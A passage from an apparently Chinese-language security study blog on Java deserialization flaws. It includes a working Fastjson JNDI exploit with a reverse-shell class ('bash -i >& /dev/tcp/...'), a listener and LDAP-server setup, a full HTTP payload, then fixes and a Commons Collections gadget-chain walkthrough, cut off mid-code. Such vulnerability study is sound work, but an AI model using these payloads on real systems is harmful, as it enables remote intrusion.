<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 9001</span><br><span class="line">编写恶意代码LinuxRevers，编译为class</span><br><span class="line">python -m http.server 8089 #python3</span><br><span class="line"></span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://192.168.142.132:8089/#LinuxRevers&quot; 9473</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//LinuxRevers.java</span><br><span class="line">public class LinuxRevers &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/192.168.142.132/9001 0&gt;&amp;1&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.142.128:8090</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 268</span><br><span class="line">&#123;&quot;a&quot;:&#123; &quot;@type&quot;:&quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,</span><br><span class="line">&quot;b&quot;:&#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://192.168.142.132:9473/LinuxRevers&quot;, &quot;autoCommit&quot;:true</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 1.2.47 版本及以下的情况下，loadClass 中默认 cache 为 true，首先使用 java.lang.Class 把获取到的类缓存到 mapping 中，然后直接从缓存中获取到了 com.sun.rowset.jdbcRowSetlmpl 这个类，即可绕过黑名单。</p>
<p>漏洞挖掘</p>
<blockquote>
<p>1、找到发送 JSON 序列化数据的接口</p>
<p>2、判断是否使用 fastjon</p>
<p>1）非法格式报错</p>
<p>{“x”:&quot;</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122154741767.png" alt="image-20221122154741767"></p>
<p>2）使用 dnslog 探测</p>
<p>{“x”:{&quot;@type&quot;:“java.net.Inet4Address” , “val”:“<span class="exturl" data-url="aHR0cDovL3h4eC5kbnNsb2cuY24=">xxx.dnslog.cn</span>”}}</p>
<p>Burp 插件</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3ppbG9uZzMwMzMvZmFzdGpzb25TY2Fu">https://github.com/zilong3033/fastjsonScan</span></p>
</blockquote>
<p>修复</p>
<blockquote>
<p>1、升级 JDK</p>
<p>6u211 / 7u201 / 8u191 /11.0.1</p>
<p>2、升级 Fastjson 到最新版</p>
<p>fastjson.parser.safeMode=true</p>
<p>3、使用安全产品过滤非法内容</p>
<p>4、更换其它序列化工具</p>
<p>Jackson/Gson</p>
</blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xOTU3MTg1">浅析 FastJSON 反序列化漏洞（1.2.24——1.2.68） - 腾讯云开发者社区 - 腾讯云 (tencent.com)</span></p>
<h3 id="apache-common-collections-反序列化漏洞"><a class="markdownIt-Anchor" href="#apache-common-collections-反序列化漏洞">#</a> Apache Common Collections 反序列化漏洞</h3>
<p>复现环境：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jdk 1.7.0_80</span><br><span class="line">IDEA Project Structrure、Settings——Javacompile等设置成java7</span><br><span class="line">Apache Commons Collections ≤ 3.2.1</span><br></pre></td></tr></table></figure>
<p>Common Collections 提供了很多新的数据结构：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Bag interface for collections that have a number of copies of each object</span><br><span class="line">BidiMap interface for maps that can be looked up from value to key as well and key to value</span><br><span class="line">MapIterator interface to provide simple and quick iteration over maps</span><br><span class="line">Transforming decorators that alter each object as it is added to the collection</span><br><span class="line">Composite collections that make multiple collections look like one</span><br><span class="line">Ordered maps and sets that retain the order elements are added in, includingan LRU based map</span><br><span class="line">Reference map that allows keys and/or values to be garbage collected underclose control</span><br><span class="line">Many comparator implementations</span><br><span class="line">Many iterator implementations</span><br><span class="line">Adapter classes from array and enumerations to collections</span><br><span class="line">Utilities to test or create typical set-theory properties of collections such asunion, intersection, and closure</span><br></pre></td></tr></table></figure>
<p>反射：</p>
<p>class 文件以 CA FE BA BE 开头</p>
<p>在程序运行的时候动态创建一个类的实例，调用实例的方法和访问它的属性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public static void test2()&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            //初始化Runtime类</span><br><span class="line">            Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">            // 调用Runtime类中的getRuntime方法得到Runtime类的对象</span><br><span class="line">            Object rt = clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz);</span><br><span class="line">            //再次使用invoke调用Runtime类中的方法时，传递我们获得的对象，这样就可以调用</span><br><span class="line">            clazz.getMethod(&quot;exec&quot;,String.class).invoke(rt,&quot;calc&quot;);</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>详细的上面有详细解释，具体可以看上面</p>
<h4 id="利用链1"><a class="markdownIt-Anchor" href="#利用链1">#</a> 利用链 1</h4>
<p>关键类：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">InvokeTransformer</span><br><span class="line">利用Java反射机制来创建类实例</span><br><span class="line"></span><br><span class="line">ChainedTransformer</span><br><span class="line">实现了Transformer链式调用，我们只需要传入一个Transformer数组ChainedTransformer就可以实现依次的去调用每一个Transformer的transform()方法</span><br><span class="line"></span><br><span class="line">ConstantTransformer</span><br><span class="line">transform()返回构造函数的对象</span><br><span class="line"></span><br><span class="line">TransformedMap</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120171605414.png" alt="image-20221120171605414"></p>
<p><strong>1.InvokerTransformer</strong></p>
<p>这个 transform (Object input) 中使用 Java 反射机制调用了 input 对象的一个方法，而该方法名是实例化 InvokerTransformer 类时传入的 iMethodName 成员变量：</p>
<p>功能函数 transform 需要传入一个对象，然后执行构造函数中给定的方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">8653385846894047688L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);    <span class="comment">//以上三句获取对象，得到方法，执行方法</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * InvokerTransformer反射触发</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransTest1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  &#123;</span><br><span class="line">        <span class="comment">// 创建实例 传入构造方法参数 （函数名 参数类型 参数值）</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;Calc.exe&quot;</span>&#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 通过反射机制依次获得Runtime类 getRuntime构造方法 最后生成Runtime实例</span></span><br><span class="line">            <span class="comment">// Object input = Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;));</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">input</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">                    <span class="comment">// 执行transform函数</span></span><br><span class="line">            invokerTransformer.transform(input);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>2.ChainedTransformer</strong></p>
<p>这个类创建实例时，需要传入一个 Transformer 数组，该类的功能就是遍历执行 Transformer 数组的 transform 函数，并且将上一次的 transform 函数的执行结果作为下一次 transform 的输入</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">3514945074733160196L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer[] iTransformers;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><strong>3.ConstantTransformer</strong></p>
<p>这个类的作用就是保存一个对象而已，创建实例时需要传入一个需要保存的对象，调用实例的 transform 即可获得其中的对象</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">6374440726369055124L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">NULL_INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>((Object)<span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//核心代码</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getConstant</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>到这里，三个 Transformer 其实就可以连接起来了，先创建一个 Transformer 数组，用 ConstantTransformer 起手，传入一个对象，用 InvokeTransformer 一步一步调用函数，再将数组传入 ChainedTransformer，调用其 transform 函数。</p>
<p>测试代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ChainedTransformer遍历触发</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   等同于 ((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;,null).invoke(null,null)).exec(&quot;calc.exe&quot;);</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransTest2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">// 获得Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// 传入Runtime类对象 反射执行getMethod获得getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="comment">// 传入getRuntime方法 反射执行invoke方法 得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="literal">null</span> &#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="comment">// 传入Runtime实例 执行exec方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;Calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ChainedTransformer</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        chainedTransformer.transform(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>4.TransformedMap</strong></p>
<p>TransformedMap 这个类中封装了一个 decorate 方法，它是用来修饰 Java 中的标准数据结构 Map，当向被修饰过的 Map 中添加新元素时，它就会执行一个回调函数；这个回调并不是传统意义上的回调函数，而是相当于执行一个对象里面的 transform 方法，前提是这个对象的类要实现了 Transformer 接口。</p>
<p>key 和 value 都是 transform 的子类，keyTransformer 是处理新元素的 Key 的回调，valueTransformer 是处理新元素的 value 的回调，当我们向 outerMap 中添加新元素时，它就会调用 keyTransformer 或者 valueTransformer 里面的 transform 方法。</p>
<p>checkSetValue 自动执行 value 中的 transform 子类对象</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMap</span> <span class="keyword">extends</span> <span class="title class_">AbstractInputCheckedMapDecorator</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">7023152376788900464L</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer keyTransformer;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><strong>5.AbstractInputCheckedMapDecorator</strong></p>
<p>通过 setValue 调用 checkSetValue</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractInputCheckedMapDecorator</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapDecorator</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">AbstractInputCheckedMapDecorator</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(entry);</span><br><span class="line">            <span class="built_in">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">            value = <span class="built_in">this</span>.parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>map 中的元素在增加删除修改的时候会调用 setValue 方法</p>
<p><strong>6.AnnotationInvocationHandler</strong></p>
<p>重写了 readobject，调用了 setValue 方法进行了键值修改</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> 